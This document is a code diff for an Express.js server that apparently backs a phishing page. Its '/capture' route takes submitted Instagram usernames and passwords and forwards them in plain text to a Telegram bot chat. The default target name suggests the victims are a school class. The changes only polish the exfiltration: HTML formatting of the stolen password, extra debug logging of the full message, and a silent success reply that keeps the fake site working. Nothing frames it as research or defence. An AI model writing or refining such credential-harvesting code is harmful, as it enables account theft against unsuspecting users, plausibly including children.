@@ -16,19 +16,20 @@ app.use(express.static(__dirname));
 app.post('/capture', async (req, res) => {
     const { username, password, target, time } = req.body || {};
 
-    console.log(`[CAPTURED] Username: ${username || 'N/A'} | Attempt: ${req.body.attempt || 'unknown'}`);
+    console.log(`[CAPTURED] Username: ${username || 'N/A'} | Password length: ${password ? password.length : 0}`);
 
     if (!username || !password) {
         return res.json({ success: true });
     }
 
+    // Clean message using HTML (recommended for passwords)
     const message = `
-*Instagram Login Captured* 🔥
+<b>Instagram Login Captured</b> 🔥
 
-*Username / Email:* ${username}
-*Password:* ||${password}||
-*Target:* ${target || "smrj.class9.confessions"}
-*Time:* ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
+<b>Username / Email:</b> ${username}
+<b>Password:</b> <code>${password}</code>
+<b>Target:</b> ${target || "smrj.class9.confessions"}
+<b>Time:</b> ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
     `.trim();
 
     try {
@@ -38,7 +39,7 @@ app.post('/capture', async (req, res) => {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: "MarkdownV2"
+                parse_mode: "HTML"          // ← Changed here
             })
         });
 
@@ -47,15 +48,17 @@ app.post('/capture', async (req, res) => {
         } else {
             const errorText = await response.text();
             console.error(`❌ Telegram API Error ${response.status}:`, errorText);
+            console.error("Full request body was:", message); // for debugging
         }
     } catch (err) {
         console.error("❌ Failed to connect to Telegram:", err.message);
     }
 
+    // Always return success to the frontend so your site doesn't break
     res.json({ success: true });
 });
 
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`Bot ready - Chat ID: ${CHAT_ID}`);
+    console.log(`📨 Telegram bot ready - Chat ID: ${CHAT_ID}`);
 });
